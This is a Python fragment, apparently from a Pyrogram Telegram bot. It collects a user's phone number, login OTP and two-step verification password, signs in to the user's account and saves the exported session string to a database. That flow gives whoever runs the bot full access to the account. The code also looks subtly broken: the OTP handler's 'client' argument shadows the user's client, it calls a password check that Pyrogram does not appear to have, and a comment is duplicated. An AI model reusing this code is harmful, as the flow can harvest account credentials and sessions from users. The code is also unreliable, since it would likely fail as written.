# Function to continue with the login after receiving the contact
# Function to continue with the login after receiving the contact
async def login_process(client, message, phone_number):
    await message.reply(f"📲 Received phone number: {phone_number}")

    try:
        await message.reply("📲 Sending OTP...")

        # Create a new Client instance for each user to handle login independently
        client = Client(f"session_{message.chat.id}", api_id, api_hash)
        await client.connect()

    except Exception as e:
        await message.reply(f"❌ Failed to send OTP {e}. Please wait and try again later.")
        return

    # Send OTP code to the phone number
    try:
        code = await client.send_code(phone_number)
    except ApiIdInvalid:
        await message.reply('❌ Invalid combination of API ID and API HASH. Please restart the session.')
        return
    except PhoneNumberInvalid:
        await message.reply('❌ Invalid phone number. Please restart the session.')
        return

    # Ask the user to enter the OTP
    await message.reply("Please enter the OTP you received (in the format: 5 4 7 2 3).")

    # Capture OTP input from the user
    @app.on_message(filters.text & filters.user(message.chat.id))
    async def otp_handler(client, otp_msg):
        # Remove spaces from the OTP entered by the user
        phone_code = otp_msg.text.replace(" ", "")
        
        # Validate the OTP (5 digits instead of 6)
        if len(phone_code) != 5 or not phone_code.isdigit():
            await otp_msg.reply("❌ Invalid OTP format. Please enter a 5-digit OTP in the format: 5 4 7 2 3.")
            return

        try:
            # Sign in with the OTP
            await client.sign_in(phone_number, code.phone_code_hash, phone_code)
        except PhoneCodeInvalid:
            await otp_msg.reply('❌ Invalid OTP. Please restart the session.')
            return
        except PhoneCodeExpired:
            await otp_msg.reply('❌ Expired OTP. Please restart the session.')
            return

        # If two-step verification is enabled
        try:
            if await client.is_password_needed():
                await otp_msg.reply("Your account has two-step verification enabled. Please enter your password.")
                password_msg = await client.listen(message.chat.id, filters=filters.text, timeout=300)
                password = password_msg.text if password_msg else None
                if not password:
                    await otp_msg.reply('❌ No password received. Please restart the session.')
                    return
                
                await client.check_password(password)
        except PasswordHashInvalid:
            await otp_msg.reply('❌ Invalid password. Please restart the session.')
            return

        # Export session string
        string_session = await client.export_session_string()
        
        # Save session string to database
        await db.set_session(message.chat.id, string_session)
        
        await client.disconnect()

        # Respond to the user
        await otp_msg.reply("✅ Login successful!")
